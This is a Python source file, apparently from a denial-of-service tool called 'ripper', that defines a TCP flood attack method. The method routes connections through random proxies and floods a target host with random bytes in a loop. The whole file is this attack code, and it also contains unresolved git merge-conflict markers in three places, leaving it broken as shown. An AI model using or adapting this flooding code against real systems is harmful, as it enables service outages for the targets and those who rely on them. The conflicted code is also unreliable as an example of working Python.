from socket import socket
from contextlib import suppress
from typing import Any
from socks import ProxyError

<<<<<<< HEAD
from ripper.errors import *
=======
from ripper.context.events_journal import EventsJournal
>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
from ripper.context.target import Target
from ripper.common import generate_random_bytes
from ripper.actions.attack_method import AttackMethod
from ripper.proxy import Proxy

# Forward Reference
Context = 'Context'

Events = EventsJournal()


class TcpFlood(AttackMethod):
    """TCP Flood method."""

    name: str = 'TCP Flood'
    label: str = 'tcp-flood'

    _sock: socket
    _target: Target
    _ctx: Context
    _proxy: Proxy = None

    def __init__(self, target: Target, _ctx: Context):
        self._target = target
        self._ctx = _ctx

    def create_connection(self) -> socket:
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)
        conn.connect(self._target.hostip_port_tuple())

        return conn

    def __call__(self, *args, **kwargs):
        with suppress(Exception), self.create_connection() as tcp_conn:
<<<<<<< HEAD
            self._target.stats.connect.status_success()
=======
            self._ctx.target.statistic.connect.status_success()
            Events.info('Creating new TCP connection...')
>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
            while self.send(tcp_conn):
                if self._ctx.dry_run:
                    break
                continue

            self._target.stats.connect.status_failed()
            # self._ctx.sock_manager.close_socket()

    def send(self, sock: socket) -> bool:
        send_bytes = generate_random_bytes(
            self._ctx.random_packet_len,
            self._ctx.max_random_packet_len)
        try:
            sent = sock.send(send_bytes)
        except ProxyError as ep:
            Events.exception(ep)
            self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
        except Exception as e:
<<<<<<< HEAD
            self._target.errors_manager.add_error(TcpSendError(message=e))
=======
            Events.exception(e)
>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
        else:
            self._target.stats.packets.status_sent(sent_bytes=sent)
            self._proxy.report_success() if self._proxy is not None else 0
            return True

        return False
